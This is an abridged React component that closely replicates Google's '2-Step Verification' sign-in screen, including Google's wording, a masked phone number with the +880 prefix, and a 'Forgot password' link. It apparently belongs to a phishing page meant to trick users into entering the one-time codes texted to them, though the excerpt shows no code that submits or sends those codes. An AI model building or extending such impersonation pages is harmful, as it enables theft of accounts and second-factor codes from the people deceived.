...
export default function Home() {
  ...
  return (
    <div className="h-screen w-full">
      ...
      <div className="m-auto h-full md:min-w-[548px] items-center justify-center flex-col flex">
        <div className="text-center text-sm flex flex-col justify-center md:border md:border-black-google  w-fit rounded-md px-8 py-10">
          ...
          <h1 className="text-[1.5rem] my-1 mt-3">2-Step Verification</h1>
          <p className="max-w-[350px] text-center pt-2">
            To help keep your account safe, Google wants to make sure it's
            really you trying to sign in
          </p>
          <div className="flex flex-row items-center m-auto gap-2 border border-gray-300 rounded-full px-1 mt-3 mb-5 hover:bg-slate-100 cursor-default py-[.1rem]">
            <svg
              className="h-5 max-h-[20px] w-fit"
              aria-hidden="true"
              class="stUf5b"
              fill="currentColor"
              focusable="false"
          ...
          <h3 className="text-[1rem] text-left font-semibold my-1 mb-2">
            2-Step Verification
          </h3>
          <p className="max-w-[300px] text-left mb-4">
            A text message with a 6-digit verification code was just send to
            (+880) ........**
          </p>
          <div
          ...
          <div className="flex justify-between items-center my-8 mb-16">
            <a
              href={"/"}
              type="submit"
              className="text-google font-semibold text-sm"
            >
              Forgot password
            </a>
            <button
